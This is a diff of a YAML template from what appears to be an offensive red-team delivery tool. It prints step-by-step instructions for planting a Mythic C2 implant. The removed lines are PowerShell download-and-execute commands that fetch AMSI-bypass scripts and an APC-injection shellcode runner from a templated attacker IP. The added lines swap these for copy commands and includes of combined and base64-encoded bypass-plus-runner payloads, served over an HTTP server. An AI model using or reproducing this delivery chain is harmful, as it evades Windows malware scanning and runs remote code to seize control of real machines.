@@ -19,12 +19,14 @@ content: |
   printf '%s\n' 'Ensure Mythic C2 is running at {{ mythic_url }} (callback port: {{ mythic_callback_port }})'; \
   printf '%s\n' '================================================================'; \
   printf '%s\n' '                  ---Step-by-Step Delivery---                  '; \
-  printf '%s\n' 'Step 1 - Run AMSI bypass (pick one):'; \
-  printf '%s\n' '  offer1.txt (FieldOffset):   IEX(New-Object Net.WebClient).DownloadString("http://{{ attacker_ip }}:{{ delivery_outbound_port }}/offer1.txt")'; \
-  printf '%s\n' '  offer2.txt (FieldOffset 2): IEX(New-Object Net.WebClient).DownloadString("http://{{ attacker_ip }}:{{ delivery_outbound_port }}/offer2.txt")'; \
-  printf '%s\n' '  offer3.txt (ForceError):    IEX(New-Object Net.WebClient).DownloadString("http://{{ attacker_ip }}:{{ delivery_outbound_port }}/offer3.txt")'; \
-  printf '%s\n' '  offer4.txt (MattGref02):    IEX(New-Object Net.WebClient).DownloadString("http://{{ attacker_ip }}:{{ delivery_outbound_port }}/offer4.txt")'; \
-  printf '%s\n' 'Step 2 - Run shellcode runner (APC injection):'; \
-  printf '%s\n' '  IEX(New-Object Net.WebClient).DownloadString("http://{{ attacker_ip }}:{{ delivery_outbound_port }}/invoice.txt")'; \
+  printf '%s\n' 'Step 1 - Pick an AMSI bypass and copy it to offer.txt:'; \
+  printf '%s\n' '  offer1.txt (FieldOffset):   cp packstation/outbound/offer1.txt packstation/outbound/offer.txt'; \
+  printf '%s\n' '  offer2.txt (FieldOffset 2): cp packstation/outbound/offer2.txt packstation/outbound/offer.txt'; \
+  printf '%s\n' '  offer3.txt (ForceError):    cp packstation/outbound/offer3.txt packstation/outbound/offer.txt'; \
+  printf '%s\n' '  offer4.txt (MattGref02):    cp packstation/outbound/offer4.txt packstation/outbound/offer.txt'; \
+  printf '%s\n' 'Step 2 - Run AMSI bypass + shellcode runner (APC injection):'; \
+  printf '%s\n' '  {{ include('payloads/transfer-amsi-bypass-shellcode-runner-windows-powershell.yaml') }}'; \
+  printf '%s\n' '  or base64 encoded:'; \
+  printf '%s\n' '  {{ include('payloads/transfer-amsi-bypass-shellcode-runner-windows-powershell-base64encoded.yaml') }}'; \
   printf '%s\n' '================================================================'; \
   python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
